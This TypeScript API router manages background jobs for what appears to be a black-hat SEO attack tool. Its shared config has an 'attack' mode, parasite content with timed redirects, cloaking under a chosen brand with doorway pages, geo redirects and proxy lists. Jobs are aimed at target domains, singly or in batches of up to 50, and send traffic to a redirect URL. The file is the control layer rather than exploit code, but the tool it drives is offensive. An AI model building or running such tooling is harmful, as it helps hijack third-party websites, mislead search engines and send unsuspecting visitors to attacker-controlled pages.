/**
 * Jobs Router — Background pipeline job management
 * 
 * Endpoints:
 *   jobs.start       — Start a new background pipeline job (returns immediately)
 *   jobs.startBatch  — Start multiple pipeline jobs for batch targets
 *   jobs.batchStatus — Get status of all jobs in a batch
 *   jobs.status      — Get current status of a specific job
 *   jobs.events      — Get events for a job (with cursor-based pagination)
 *   jobs.cancel      — Cancel a running job
 *   jobs.list        — List recent jobs for the current user
 *   jobs.running     — Get all currently running job IDs
 */
import { z } from "zod";
import { protectedProcedure, router } from "../_core/trpc";
import {
  startBackgroundJob,
  startBatchJob,
  getBatchStatus,
  cancelJob,
  getJobStatus,
  getJobEvents,
  listUserJobs,
  isJobRunning,
  getRunningJobIds,
} from "../job-runner";

// Shared input schema for attack config
const attackConfigSchema = z.object({
  mode: z.enum(["attack", "fixated", "emergent"]).default("emergent"),
  maxIterations: z.number().min(1).max(20).default(5),
  seoKeywords: z.string().optional(),
  geoRedirect: z.boolean().default(true),
  parasiteContentLength: z.enum(["short", "medium", "long"]).default("medium"),
  parasiteRedirectDelay: z.number().min(0).max(30).default(5),
  enableCloaking: z.boolean().default(true),
  cloakingBrand: z.string().optional(),
  cloakingContentType: z.enum(["landing", "article", "doorway", "review"]).default("landing"),
  proxyList: z.string().optional(),
  weightedRedirects: z.string().optional(),
  methodPriority: z.array(z.object({
    id: z.string(),
    enabled: z.boolean(),
  })).optional(),
});

export const jobsRouter = router({
  /** Start a new background pipeline job */
  start: protectedProcedure
    .input(z.object({
      targetDomain: z.string().min(1),
      redirectUrl: z.string().min(1),
    }).merge(attackConfigSchema))
    .mutation(async ({ ctx, input }) => {
      const result = await startBackgroundJob({
        userId: ctx.user.id,
        targetDomain: input.targetDomain,
        redirectUrl: input.redirectUrl,
        mode: input.mode,
        maxIterations: input.maxIterations,
        seoKeywords: input.seoKeywords,
        geoRedirect: input.geoRedirect,
        parasiteContentLength: input.parasiteContentLength,
        parasiteRedirectDelay: input.parasiteRedirectDelay,
        enableCloaking: input.enableCloaking,
        cloakingBrand: input.cloakingBrand,
        cloakingContentType: input.cloakingContentType,
        proxyList: input.proxyList,
        weightedRedirects: input.weightedRedirects,
        methodPriority: input.methodPriority,
      });
      return result;
    }),

  /** Start a batch of pipeline jobs for multiple targets */
  startBatch: protectedProcedure
    .input(z.object({
      targets: z.array(z.object({
        domain: z.string().min(1),
        redirectUrl: z.string().min(1),
      })).min(1).max(50),
    }).merge(attackConfigSchema))
    .mutation(async ({ ctx, input }) => {
      const result = await startBatchJob({
        userId: ctx.user.id,
        targets: input.targets,
        mode: input.mode,
        maxIterations: input.maxIterations,
        seoKeywords: input.seoKeywords,
        geoRedirect: input.geoRedirect,
        parasiteContentLength: input.parasiteContentLength,
        parasiteRedirectDelay: input.parasiteRedirectDelay,
        enableCloaking: input.enableCloaking,
        cloakingBrand: input.cloakingBrand,
        cloakingContentType: input.cloakingContentType,
        proxyList: input.proxyList,
        weightedRedirects: input.weightedRedirects,
        methodPriority: input.methodPriority,
      });
      return result;
    }),

  /** Get status of all jobs in a batch */
  batchStatus: protectedProcedure
    .input(z.object({
      deployIds: z.array(z.number()).min(1).max(50),
    }))
    .query(async ({ ctx, input }) => {
      const result = await getBatchStatus(input.deployIds);
      // Filter to only show user's own jobs
      if (ctx.user.role !== "superadmin") {
        result.jobs = result.jobs.filter((j: any) => j?.userId === ctx.user.id);
      }
      return result;
    }),

  /** Get current status of a specific job */
  status: protectedProcedure
    .input(z.object({
      deployId: z.number(),
    }))
    .query(async ({ ctx, input }) => {
      const status = await getJobStatus(input.deployId);
      if (!status) return null;
      // Security: only allow viewing own jobs (or superadmin)
      if (status.userId !== ctx.user.id && ctx.user.role !== "superadmin") {
        return null;
      }
      return status;
    }),

  /** Get events for a job (cursor-based for polling) */
  events: protectedProcedure
    .input(z.object({
      deployId: z.number(),
      afterId: z.number().optional(),
      limit: z.number().min(1).max(500).default(100),
    }))
    .query(async ({ ctx, input }) => {
      // Verify ownership first
      const status = await getJobStatus(input.deployId);
      if (!status) return { events: [], hasMore: false };
      if (status.userId !== ctx.user.id && ctx.user.role !== "superadmin") {
        return { events: [], hasMore: false };
      }

      const events = await getJobEvents(input.deployId, input.afterId, input.limit + 1);
      const hasMore = events.length > input.limit;
      if (hasMore) events.pop();

      return {
        events,
        hasMore,
        lastEventId: events.length > 0 ? events[events.length - 1].id : input.afterId || 0,
      };
    }),

  /** Cancel a running job */
  cancel: protectedProcedure
    .input(z.object({
      deployId: z.number(),
    }))
    .mutation(async ({ ctx, input }) => {
      // Verify ownership
      const status = await getJobStatus(input.deployId);
      if (!status) return { success: false, error: "Job not found" };
      if (status.userId !== ctx.user.id && ctx.user.role !== "superadmin") {
        return { success: false, error: "Not authorized" };
      }

      const cancelled = cancelJob(input.deployId);
      return { success: cancelled, error: cancelled ? null : "Job is not running" };
    }),

  /** Cancel all jobs in a batch */
  cancelBatch: protectedProcedure
    .input(z.object({
      deployIds: z.array(z.number()).min(1).max(50),
    }))
    .mutation(async ({ ctx, input }) => {
      const results: Array<{ deployId: number; cancelled: boolean }> = [];
      for (const deployId of input.deployIds) {
        const status = await getJobStatus(deployId);
        if (!status || (status.userId !== ctx.user.id && ctx.user.role !== "superadmin")) {
          results.push({ deployId, cancelled: false });
          continue;
        }
        const cancelled = cancelJob(deployId);
        results.push({ deployId, cancelled });
      }
      return { results, totalCancelled: results.filter(r => r.cancelled).length };
    }),

  /** List recent jobs for the current user */
  list: protectedProcedure
    .input(z.object({
      limit: z.number().min(1).max(100).default(20),
    }).optional())
    .query(async ({ ctx, input }) => {
      return listUserJobs(ctx.user.id, input?.limit || 20);
    }),

  /** Get all currently running job IDs (for quick status check) */
  running: protectedProcedure
    .query(async () => {
      return { jobIds: getRunningJobIds() };
    }),
});
